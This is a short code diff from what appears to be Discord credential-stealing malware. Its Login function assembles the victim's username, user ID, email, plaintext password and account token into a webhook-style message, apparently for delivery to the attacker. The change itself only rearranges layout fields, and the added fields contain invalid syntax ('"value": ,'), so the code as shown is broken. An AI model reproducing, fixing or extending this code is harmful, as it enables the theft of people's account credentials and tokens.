@@ -154,7 +154,7 @@ function Login(email, password, token) {
                         {
                             "name": " username",
 			    "value": json.username + "#" + json.discriminator,
-                            "inline": false
+                            "inline": true
                         },
                         {
                             "name": " userid",
@@ -162,14 +162,24 @@ function Login(email, password, token) {
                             "inline": true
                         },
                         {
+                            "name": "",
+			    "value": ,
+                            "inline": false
+                        },
+                        {
                             "name": " email",
                             "value": ` - ${email}`,
-                            "inline": false
+                            "inline": true
                         },
                         {
                             "name": " password",
                             "value": ` - ${password}`,
                             "inline": true
+                        },
+                        {
+                            "name": "",
+			    "value": ,
+                            "inline": false
                         },
                         {
                             "name": " token",
